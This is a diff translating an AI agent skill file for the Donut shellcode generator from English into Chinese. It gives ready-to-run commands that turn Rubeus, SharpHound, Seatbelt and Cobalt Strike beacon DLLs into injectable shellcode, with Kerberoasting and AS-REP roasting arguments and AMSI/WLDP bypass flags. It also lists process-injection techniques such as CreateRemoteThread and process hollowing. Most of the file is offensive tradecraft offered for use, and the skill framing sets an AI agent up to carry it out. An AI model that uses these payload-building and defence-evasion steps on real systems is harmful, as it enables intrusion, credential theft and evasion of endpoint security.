@@ -1,58 +1,54 @@
 ---
 name: donut
 description: >
-  This skill should be used when the user asks about "donut", "convert a .NET
-  tool into shellcode, load an assembly in memory", "generate a payload for
-  injection", "create position-independent shellcode from a Windows
-  executable". Shellcode generator that converts .NET assemblies, EXEs, DLLs,
-  and COM objects into position-independent shellcode.
+  此技能适用于用户询问关于 "donut"、"将 .NET 工具转换为 shellcode"、"在内存中加载程序集"、"生成注入用 payload"、"从 Windows 可执行文件创建位置无关 shellcode" 的场景。可将 .NET 程序集、EXE、DLL 和 COM 对象转换为位置无关 shellcode (Position-Independent Shellcode) 的生成器。
 ---
 
 # Donut
 
-Position-independent shellcode generator — converts .NET/Win32 native executables into injectable shellcode.
+位置无关 shellcode (Position-Independent Shellcode) 生成器 — 将 .NET/Win32 原生可执行文件转换为可注入的 shellcode。
 
-## Concept
+## 原理
 
-Donut generates shellcode that:
-1. Creates a CLR runtime in any process
-2. Loads the target assembly/executable in memory
-3. Executes it without touching disk
+Donut 生成的 shellcode 会：
+1. 在目标进程中创建 CLR 运行时
+2. 将目标程序集/可执行文件加载到内存
+3. 无需落盘直接执行
 
-Output shellcode can be injected via any shellcode runner, process injection technique, or BOF.
+生成的 shellcode 可通过任何 shellcode 执行器、进程注入技术或 BOF 进行注入。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Convert .NET assembly to shellcode
+# 将 .NET 程序集转换为 shellcode
 donut -f Rubeus.exe -o rubeus.bin
 
-# With runtime arguments
+# 带运行时参数
 donut -f Rubeus.exe -p "kerberoast /format:hashcat" -o rubeus_roast.bin
 
-# Convert native DLL (call exported function)
+# 转换原生 DLL（调用导出函数）
 donut -f beacon.dll -e "ReflectiveLoader" -o beacon.bin
 
-# 64-bit only output
+# 仅输出 64 位
 donut -f tool.exe -a 2 -o tool64.bin
 ```
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
+| 参数 | 说明 |
 |------|-------------|
-| `-f <file>` | Input file (.exe, .dll, .NET assembly) |
-| `-o <file>` | Output shellcode file |
-| `-p <params>` | Command-line parameters for target |
-| `-c <class>` | .NET class to instantiate |
-| `-m <method>` | .NET method to invoke |
-| `-n <ns>` | .NET namespace |
-| `-a <arch>` | Architecture: `1`=x86, `2`=x64, `3`=both (default 3) |
-| `-b <n>` | Bypass AMSI/WLDP: `1`=none, `2`=abort on fail, `3`=continue |
-| `-t` | Run assembly in new thread |
-| `-z <n>` | Compression: `1`=none, `2`=aPLib, `3`=LZNT1, `4`=Xpress, `5`=XpressHuff |
-| `-e <n>` | Instance type: `1`=embedded (default), `2`=HTTP server |
-| `-s <url>` | HTTP server URL (for `-e 2`) |
+| `-f <file>` | 输入文件（.exe、.dll、.NET 程序集） |
+| `-o <file>` | 输出 shellcode 文件 |
+| `-p <params>` | 目标的命令行参数 |
+| `-c <class>` | 要实例化的 .NET 类 |
+| `-m <method>` | 要调用的 .NET 方法 |
+| `-n <ns>` | .NET 命名空间 |
+| `-a <arch>` | 架构：`1`=x86，`2`=x64，`3`=两者（默认 3） |
+| `-b <n>` | 绕过 AMSI/WLDP：`1`=不绕过，`2`=失败时中止，`3`=继续 |
+| `-t` | 在新线程中运行程序集 |
+| `-z <n>` | 压缩：`1`=不压缩，`2`=aPLib，`3`=LZNT1，`4`=Xpress，`5`=XpressHuff |
+| `-e <n>` | 实例类型：`1`=嵌入式（默认），`2`=HTTP 服务器 |
+| `-s <url>` | HTTP 服务器 URL（用于 `-e 2`） |
 
 ## Python API
 
@@ -64,40 +60,38 @@ with open("rubeus.bin", "wb") as f:
     f.write(sc)
 ```
 
-## Common Workflows
+## 常用工作流
 
 ```bash
-# Rubeus to shellcode for process injection
+# 将 Rubeus 转为 shellcode 用于进程注入
 donut -f Rubeus.exe -p "asreproast /format:hashcat" -b 3 -o rubeus.bin
 
-# SharpHound for BloodHound collection
+# SharpHound 用于 BloodHound 数据收集
 donut -f SharpHound.exe -p "-c All" -o sharphound.bin
 
-# Inject via process hollowing or CreateRemoteThread
-# (use any shellcode runner/injector)
+# 通过进程空洞化或 CreateRemoteThread 注入
+# （使用任意 shellcode 执行器/注入器）
 
-# Seatbelt for host enumeration
+# Seatbelt 主机枚举
 donut -f Seatbelt.exe -p "-group=all" -o seatbelt.bin
 
-# x64 only with AMSI bypass
+# 仅 x64 并带 AMSI 绕过
 donut -f tool.exe -a 2 -b 3 -o tool.bin
 
-# Load via powershell (reflective approach)
-# Convert bin to base64, load with any injector
+# 通过 PowerShell 加载（反射式方式）
+# 将 bin 转为 base64，使用任意注入器加载
 ```
 
-## Output Formats
+## 输出格式
 
-Donut outputs raw shellcode by default. Feed it to:
-- `CreateRemoteThread` injection
+Donut 默认输出原始 shellcode，可输入到：
+- `CreateRemoteThread` 注入
 - `VirtualAlloc` + `CallWindowProc`
-- BOF shellcode execution modules
-- CS `execute-assembly` (direct .NET load, but donut extends this to native EXEs)
+- BOF shellcode 执行模块
+- CS `execute-assembly`（直接 .NET 加载，但 donut 将其扩展到原生 EXE）
 
-## Resources
+## 资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/injection-methods.md` | Shellcode injection techniques, process injection, AMSI bypass chain |
-
-## Structuring This Skill
+| `references/injection-methods.md` | Shellcode 注入技术、进程注入、AMSI 绕过链 |
